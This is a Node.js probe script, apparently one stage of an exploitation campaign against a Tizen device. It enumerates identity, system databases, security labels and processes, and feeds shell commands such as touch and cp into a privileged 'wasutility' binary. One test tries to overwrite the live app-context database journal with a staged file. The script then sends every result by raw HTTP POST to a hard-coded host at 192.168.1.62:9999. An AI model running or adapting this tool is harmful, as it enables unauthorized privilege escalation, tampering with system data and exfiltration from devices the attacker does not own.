"use strict";

/* p47: wasutility battery + /opt/dbspace state + WAS daemon hunt
   1. identity + staged journal md5
   2. /opt/dbspace: stat + md5 live DB + journal (il journal stale f63c46a5 c'e' ancora?)
   3. WAS daemon hunt: ps + proc-exe links + org.tizen.webappservice + /opt/usr/apps/org.tizen.webappservice
   4. download-provider alive?
   5. wasutility battery (parent = sh, owner context):
      T1 no args stdin=/dev/null
      T2 interactive: printf 'touch /tmp/wasint_test' | wasutility
      T3 -e /tmp/was_t1 (remove_dir)
      T4 -V   T5 -v   T6 -g /tmp/was_t1   T7 -h   T8 -p
      T10 placement: printf 'cp ...' | wasutility  + md5sum verify
   6. ls -Z /opt/dbspace (SMACK labels)
   7. /proc/locks
   exfil /p47info
*/

var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var R = { ts: new Date().toISOString(), probe: 'p47', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(90000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 240000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p47info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs) {
  try {
    var out = cp.execSync(cmd, { timeout: timeoutMs || 25000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
    return '[exit 0] ' + out;
  } catch (e) {
    var o = '';
    if (e.stdout) o += e.stdout.toString();
    if (e.stderr) o += (o ? '\n' : '') + e.stderr.toString();
    return '[exit ' + (e.status === undefined ? '?' : e.status) + '] ' + (o || (e && e.message) || 'unknown').substring(0, 4000);
  }
}

function main() {
  R.results.identity = run('id 2>&1; echo ---; whoami 2>&1', 10000);

  R.results.staged = run('ls -la /home/owner/share/tmp/sdk_tools/ 2>&1 | head -15; echo ---; md5sum /home/owner/share/tmp/sdk_tools/appctx_hot_journal 2>&1; md5sum /home/owner/share/tmp/sdk_tools/.app-context.db-journal 2>&1', 15000);

  R.results.dbspace = run('ls -la /opt/dbspace/ 2>&1 | head -30; echo ---LIVE; stat /opt/dbspace/.app-context.db 2>&1; md5sum /opt/dbspace/.app-context.db 2>&1; echo ---JRN; stat /opt/dbspace/.app-context.db-journal 2>&1; md5sum /opt/dbspace/.app-context.db-journal 2>&1', 20000);

  R.results.dbspace_z = run('ls -Z /opt/dbspace/ 2>&1 | head -25', 15000);

  R.results.wasdaemon = run('ps aux 2>/dev/null | grep -viE "^\\S*\\s+\\S*\\s+grep" | grep -iE "webapp|\\bwas|download|appctx" | head -20; echo ---EXES; for p in /proc/[0-9]*/exe; do readlink "$p" 2>/dev/null; done | sort | uniq -c | sort -rn | head -40', 40000);

  R.results.org_paths = run('ls -la /org.tizen.webappservice/ 2>&1 | head -10; echo ---BIN; ls -la /org.tizen.webappservice/bin/ 2>&1 | head -10; echo ---PKG; ls -la /opt/usr/apps/org.tizen.webappservice/ 2>&1 | head -15; echo ---PKGBIN; ls -la /opt/usr/apps/org.tizen.webappservice/bin/ 2>&1 | head -15', 20000);

  R.results.dlprovider = run('ps aux 2>/dev/null | grep -i download | grep -v grep | head -5; echo ---; ls -la /proc/*/exe 2>/dev/null | grep -i download | head -5', 15000);

  // --- wasutility battery ---
  R.results.wu_T1_noargs = run('wasutility < /dev/null 2>&1 | head -20; echo T1_exit=$?', 25000);

  R.results.wu_T2_interactive = run('rm -f /tmp/wasint_test; printf "touch /tmp/wasint_test\\n" | wasutility 2>&1 | head -30; echo T2_exit=$?; echo ---; ls -la /tmp/wasint_test 2>&1; ls -Z /tmp/wasint_test 2>&1', 30000);

  R.results.wu_T3_remove_dir = run('mkdir -p /tmp/was_t1 && wasutility -e /tmp/was_t1 2>&1 | head -20; echo T3_exit=$?; echo ---; ls -d /tmp/was_t1 2>&1', 25000);

  R.results.wu_T4V = run('wasutility -V 2>&1 | head -10; echo T4_exit=$?', 25000);
  R.results.wu_T5v = run('wasutility -v 2>&1 | head -10; echo T5_exit=$?', 25000);
  R.results.wu_T6g = run('wasutility -g /tmp/was_t1 2>&1 | head -10; echo T6_exit=$?', 25000);
  R.results.wu_T7h = run('wasutility -h 2>&1 | head -15; echo T7_exit=$?', 25000);
  R.results.wu_T8p = run('wasutility -p 2>&1 | head -20; echo T8_exit=$?', 25000);

  R.results.wu_T10_placement = run('printf "cp /home/owner/share/tmp/sdk_tools/appctx_hot_journal /opt/dbspace/.app-context.db-journal\\n" | wasutility 2>&1 | head -30; echo T10_exit=$?; echo ---VERIFY; md5sum /opt/dbspace/.app-context.db-journal 2>&1; stat /opt/dbspace/.app-context.db-journal 2>&1; ls -Z /opt/dbspace/.app-context.db-journal 2>&1', 40000);

  R.results.proc_locks = run('cat /proc/locks 2>&1 | head -40', 15000);

  R.results.tmp_was = run('ls -la /tmp/wasint_test /tmp/was_t1 2>&1', 10000);

  L('done ' + new Date().toISOString());
  postFinal();
  setTimeout(postFinal, 20000);
}

try { main(); } catch (e) { R.results.fatal = String(e) + ' | ' + (e.stack || 'no-stack'); postFinal(); }
